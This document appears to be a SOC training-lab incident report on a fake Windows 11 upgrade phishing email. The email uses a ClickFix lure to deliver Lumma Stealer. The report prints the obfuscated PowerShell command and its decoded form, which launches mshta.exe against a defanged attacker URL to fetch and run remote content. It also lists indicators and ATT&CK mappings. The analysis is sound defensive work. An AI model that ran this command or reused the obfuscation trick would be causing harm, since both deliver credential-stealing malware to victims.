# Lumma Stealer - ClickFix Phishing

## 1. Alert Summary

| Field | Value |
|---|---|
| Event ID | 316 |
| Detection Rule | SOC338 - Lumma Stealer - DLL Side-Loading via ClickFix Phishing |
| Event Time | 2025-03-13 09:44 |
| Severity | Critical |
| Category | Data Leakage / Phishing |
| Sender | update@windows-update.site |
| Recipient | dylan@letsdefend.io |
| SMTP IP | 132.232.40.201 |
| Subject | Upgrade your system to Windows 11 Pro for FREE |
| Investigation Verdict | True Positive |

## 2. Investigation Overview

A phishing email impersonating a Windows 11 upgrade notification was delivered to an internal user.

The user accessed a malicious URL that presented a ClickFix social-engineering scenario and instructed the victim to execute an obfuscated command.

The investigation identified PowerShell activity, execution of `mshta.exe`, and communication with suspicious external infrastructure associated with Lumma Stealer delivery.

## 3. Evidence Analysis

### Email Analysis

The email claimed to offer a free Windows 11 Pro upgrade.

The sender domain `windows-update.site` was not associated with Microsoft. The message used urgency and repeated upgrade prompts to encourage interaction with the malicious link.

### Command Analysis

The original command contained obfuscated characters:

```powershell
('ms]]]ht]]]a]]].]]]exe hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']')
```

After removing the inserted characters, the command resolved to:

```cmd
mshta.exe hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4
```

This shows PowerShell preparing to launch `mshta.exe` with remote content hosted on a suspicious domain.

### Indicators of Compromise

| Type | Indicator |
|---|---|
| Sender | update@windows-update.site |
| SMTP IP | 132.232.40.201 |
| Domain | overcoatpassably.shop |
| URL Path | `/Z8UZbPyVpGfdRS/maloy.mp4` |
| Process | `powershell.exe` |
| Process | `mshta.exe` |
| Malware Family | Lumma Stealer |

The official alert identifies the scenario as Lumma Stealer delivery via ClickFix and DLL Side-Loading.

The available report does not identify the specific DLL filename or the legitimate process used for side-loading. Therefore, that part of the execution chain should remain attributed to the alert classification and external reference rather than presented as independently reconstructed endpoint evidence.

### External Reference

[Independent SOC338 investigation](https://securebydefault.io/blog/soc338-lumma-stealer-dll-sideloading-clickfix-phishing/)

The external investigation confirms phishing email delivery, user access to the malicious URL, and endpoint containment. It also provides context for the ClickFix and DLL Side-Loading techniques.

## 4. MITRE ATT&CK Mapping

| Technique | Name | Supporting Evidence |
|---|---|---|
| T1566.002 | Spearphishing Link | Email contained a malicious upgrade link |
| T1204.001 | User Execution: Malicious Link | User accessed the phishing URL |
| T1059.001 | PowerShell | PowerShell used to prepare the command |
| T1027 | Obfuscated Files or Information | Inserted characters used to obscure the command |
| T1218.005 | System Binary Proxy Execution: Mshta | `mshta.exe` launched with remote content |
| T1574.002 | Hijack Execution Flow: DLL Side-Loading | Technique identified by the alert classification |

T1574.002 is included as the alert's stated technique. The individual DLL and process evidence should be added if available in the endpoint telemetry.

## 5. Response Actions

- Reviewed phishing email metadata and content.
- Investigated the malicious URL.
- Analyzed the obfuscated PowerShell command.
- Identified the execution of `mshta.exe`.
- Correlated activity with the Lumma Stealer alert classification.
- Reviewed external threat intelligence.
- Recorded email deletion and endpoint containment in the independent investigation.

## 6. Conclusion

The investigation confirmed a **True Positive** phishing incident involving a ClickFix lure impersonating a Windows 11 upgrade.

The available evidence identified user interaction with a malicious URL, an obfuscated PowerShell command, and execution of `mshta.exe` with remote content.

The alert classified the activity as Lumma Stealer delivery via DLL Side-Loading. The specific DLL/process pair was not independently documented in the supplied report.

**Final Verdict: True Positive**

**Classification: ClickFix Phishing / Lumma Stealer**
